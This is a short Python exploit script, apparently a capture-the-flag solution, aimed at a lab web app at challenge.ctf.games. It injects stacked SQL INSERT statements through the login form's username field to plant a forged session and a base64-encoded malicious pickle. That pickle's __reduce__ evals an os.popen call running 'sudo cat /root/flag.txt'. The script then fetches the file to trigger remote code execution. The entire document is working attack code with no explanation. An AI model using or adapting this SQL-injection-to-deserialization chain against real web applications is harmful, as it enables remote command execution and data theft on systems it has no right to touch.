from bs4 import BeautifulSoup
import random
import requests
import pickle
import base64

class RCE:
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        cmd = (f'flash(os.popen("{payload}").read().strip()) or redirect(url_for("files"))')
        return eval, (cmd,)


if __name__ == '__main__':
    url = "http://challenge.ctf.games:30451"
    payload = "sudo cat /root/flag.txt"
    filename = random.randint(1,5000000)
    pickled = base64.urlsafe_b64encode(pickle.dumps(RCE(payload)))
    pickled = str(pickled).replace("b'","")
    parameters = fr"username=\;%0AINSERT%0AOR%0AIGNORE%0AINTO%0Aactivesessions%0A(sessionid,%0Ausername,%0Atimestamp)%0AVALUES%0A(\TESTCTF\,%0A\TESTCTF\,%0A\TESTCTF\);%0AINSERT%0AINTO%0Afiles%0A(filename,%0Adata,%0Asessionid)%0AVALUES%0A(\{filename}\,%0A\{pickled}\,%0A\TESTCTF\);--&password="
    header = { "Content-Type": "application/x-www-form-urlencoded" }
    response = requests.post(f"{url}/login", data=parameters, headers=header)
    response = requests.get(f"{url}/download/{filename}/TESTCTF")
    
    output = BeautifulSoup(response.text, "html.parser").find("div", class_="mt-3 alert alert-danger")
    if output:
        extracted_text = output.get_text(separator="\n", strip=True)
        print(extracted_text)
    else:
        print("No output found.")